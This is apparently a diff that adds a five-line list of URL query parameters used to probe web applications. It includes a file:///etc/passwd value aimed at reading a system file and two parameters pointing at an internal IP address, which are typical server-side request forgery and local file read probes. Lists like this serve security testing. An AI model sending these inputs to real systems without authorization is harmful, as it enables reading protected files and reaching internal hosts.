@@ -1,0 +1,5 @@
+?data=foobar
+?file=file:///etc/passwd
+?url=http://192.168.45.231/render/url
+?input=foobar
+?target=http://192.168.45.231/render/target
